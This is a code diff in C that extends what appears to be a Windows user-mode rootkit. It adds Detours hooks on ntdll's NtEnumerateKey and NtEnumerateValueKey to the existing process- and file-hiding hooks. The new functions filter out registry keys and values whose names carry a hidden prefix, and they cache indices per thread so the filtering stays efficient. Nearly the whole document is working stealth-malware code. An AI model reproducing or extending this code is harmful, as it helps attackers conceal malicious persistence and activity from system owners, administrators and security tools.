@@ -13,10 +13,21 @@
 
 /* ------------------------------------------------------------------------------------------------------ */
 
-fnNtQuerySystemInformation g_NtQuerySystemInformation;
-fnNtQueryDirectoryFile g_NtQueryDirectoryFile;
-fnRtlUnicodeStringToAnsiString g_RtlUnicodeStringToAnsiString;
-fnNtQueryDirectoryFileEx g_NtQueryDirectoryFileEx;
+fnNtQuerySystemInformation                  g_NtQuerySystemInformation;
+fnNtQueryDirectoryFile                      g_NtQueryDirectoryFile;
+fnRtlUnicodeStringToAnsiString              g_RtlUnicodeStringToAnsiString;
+fnNtQueryDirectoryFileEx                    g_NtQueryDirectoryFileEx;
+fnNtEnumerateKey                            g_NtEnumerateKey;
+fnNtEnumerateValueKey                       g_NtEnumerateValueKey;
+
+DWORD TlsNtEnumerateKeyCacheKey;
+DWORD TlsNtEnumerateKeyCacheIndex;
+DWORD TlsNtEnumerateKeyCacheI;
+DWORD TlsNtEnumerateKeyCacheCorrectedIndex;
+DWORD TlsNtEnumerateValueKeyCacheKey;
+DWORD TlsNtEnumerateValueKeyCacheIndex;
+DWORD TlsNtEnumerateValueKeyCacheI;
+DWORD TlsNtEnumerateValueKeyCacheCorrectedIndex;
 
 /* ------------------------------------------------------------------------------------------------------ */
 
@@ -135,6 +146,100 @@ NTSTATUS MyNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTI
     return stat;
 }
 
+NTSTATUS MyNtEnumerateKey(HANDLE KeyHandle, ULONG Index, NT_KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
+
+    if (KeyInformationClass == KeyNodeInformation)
+    {
+        return g_NtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+    }
+
+    HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateKeyCacheKey);
+    ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheIndex);
+    ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheI);
+    ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheCorrectedIndex);
+
+    ULONG i = 0;
+    ULONG correctedIndex = 0;
+
+    if (cacheKey == KeyHandle && cacheIndex == Index - 1)
+    {
+        // This function was recently called the index - 1, so we can continue from the last known position.
+        // This increases performance from O(N^2) to O(N).
+        i = cacheI;
+        correctedIndex = cacheCorrectedIndex + 1;
+    }
+
+    BYTE buffer[1024];
+    PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
+
+    for (; i <= Index; correctedIndex++)
+    {
+        if (g_NtEnumerateKey(KeyHandle, correctedIndex, KeyBasicInformation, basicInformation, 1024, ResultLength) != ERROR_SUCCESS)
+        {
+            return g_NtEnumerateKey(KeyHandle, correctedIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+        }
+
+        if (!HasPrefix(basicInformation->Name))
+        {
+            i++;
+        }
+    }
+
+    correctedIndex--;
+
+    TlsSetValue(TlsNtEnumerateKeyCacheKey, KeyHandle);
+    TlsSetValue(TlsNtEnumerateKeyCacheIndex, Index);
+    TlsSetValue(TlsNtEnumerateKeyCacheI, i);
+    TlsSetValue(TlsNtEnumerateKeyCacheCorrectedIndex, correctedIndex);
+
+    return g_NtEnumerateKey(KeyHandle, correctedIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+}
+
+NTSTATUS MyNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength) {
+
+    HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateValueKeyCacheKey);
+    ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheIndex);
+    ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheI);
+    ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex);
+
+    ULONG i = 0;
+    ULONG correctedIndex = 0;
+
+    if (cacheKey == key && cacheIndex == index - 1)
+    {
+        // This function was recently called the index - 1, so we can continue from the last known position.
+        // This increases performance from O(N^2) to O(N).
+        i = cacheI;
+        correctedIndex = cacheCorrectedIndex + 1;
+    }
+
+    BYTE buffer[1024];
+    PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;
+
+    for (; i <= index; correctedIndex++)
+    {
+        if (g_NtEnumerateValueKey(key, correctedIndex, KeyValueBasicInformation, basicInformation, 1024, resultLength) != ERROR_SUCCESS)
+        {
+            return g_NtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+        }
+
+        if (!HasPrefix(basicInformation->Name))
+        {
+            i++;
+        }
+    }
+
+    correctedIndex--;
+
+    TlsSetValue(TlsNtEnumerateValueKeyCacheKey, key);
+    TlsSetValue(TlsNtEnumerateValueKeyCacheIndex, index);
+    TlsSetValue(TlsNtEnumerateValueKeyCacheI, i);
+    TlsSetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex, correctedIndex);
+
+    return g_NtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+
+}
+
 /*----------------------------------------------------------------------------------------------------------*/
 
 VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID hookedFunction) {
@@ -160,8 +265,19 @@ VOID InitializeHooks() {
     InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
     InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
     InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)&g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx);
+    InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID)&g_NtEnumerateKey, MyNtEnumerateKey);
+    InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID)&g_NtEnumerateValueKey, MyNtEnumerateValueKey);
     DetourTransactionCommit();
-    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile); 
+    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile);
+
+    TlsNtEnumerateKeyCacheKey = TlsAlloc();
+    TlsNtEnumerateKeyCacheIndex = TlsAlloc();
+    TlsNtEnumerateKeyCacheI = TlsAlloc();
+    TlsNtEnumerateKeyCacheCorrectedIndex = TlsAlloc();
+    TlsNtEnumerateValueKeyCacheKey = TlsAlloc();
+    TlsNtEnumerateValueKeyCacheIndex = TlsAlloc();
+    TlsNtEnumerateValueKeyCacheI = TlsAlloc();
+    TlsNtEnumerateValueKeyCacheCorrectedIndex = TlsAlloc();
 
 }
 
@@ -172,7 +288,18 @@ VOID UninitializeHooks() {
     Unhook((LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
     Unhook((LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
     Unhook((LPVOID)&g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx);
+    Unhook((LPVOID)&g_NtEnumerateKey, MyNtEnumerateKey);
+    Unhook((LPVOID)&g_NtEnumerateValueKey, MyNtEnumerateValueKey);
     DetourTransactionCommit();
+
+    TlsFree(TlsNtEnumerateKeyCacheKey);
+    TlsFree(TlsNtEnumerateKeyCacheIndex);
+    TlsFree(TlsNtEnumerateKeyCacheI);
+    TlsFree(TlsNtEnumerateKeyCacheCorrectedIndex);
+    TlsFree(TlsNtEnumerateValueKeyCacheKey);
+    TlsFree(TlsNtEnumerateValueKeyCacheIndex);
+    TlsFree(TlsNtEnumerateValueKeyCacheI);
+    TlsFree(TlsNtEnumerateValueKeyCacheCorrectedIndex);
 
 }
 
